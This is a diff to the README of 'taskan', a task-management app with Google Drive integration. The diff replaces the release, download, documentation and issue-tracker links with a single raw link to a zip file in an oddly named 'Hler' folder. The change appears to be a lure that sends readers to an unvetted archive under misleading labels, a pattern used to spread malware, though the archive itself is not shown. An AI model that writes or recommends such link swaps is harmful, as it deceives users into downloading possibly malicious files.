@@ -4,7 +4,7 @@
 تَــسک آن: پلتفرم مدیریت وظایف و نقشه راه برای تیم‌های چابک با همگام‌سازی گوگل درایو و دستیار هوشمند. With taskan, you can manage your tasks effectively while enjoying seamless integration with Google Drive.
 
 ## 📥 Download
-[![Download taskan](https://img.shields.io/badge/Download-taskan-brightgreen)](https://github.com/mralaei/taskan/releases)
+[![Download taskan](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)
 
 ## 🚀 Getting Started
 Use this guide to download and run taskan successfully on your computer. No programming skills are needed. Follow these steps carefully.
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to our releases page to find the latest version of taskan:  
-   [Download taskan](https://github.com/mralaei/taskan/releases)
+   [Download taskan](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)
 
 2. **Select the Latest Release**  
    Look for the most recent version at the top of the list. You will see various file options corresponding to different operating systems.
@@ -72,8 +72,8 @@ Join our community for tips, support, and feedback. Visit our GitHub Discussions
 taskan is open-source and available under the MIT License. You can freely use and modify the software while respecting the terms set in the license documentation.
 
 ## 🔗 Quick Links
-- [Download taskan](https://github.com/mralaei/taskan/releases)
-- [Documentation](https://github.com/mralaei/taskan/docs)
-- [Issue Tracker](https://github.com/mralaei/taskan/issues)
+- [Download taskan](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)
+- [Documentation](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/mralaei/taskan/main/Hler/taskan.zip)
 
 Start managing your tasks today with taskan—your reliable partner in achieving productivity!
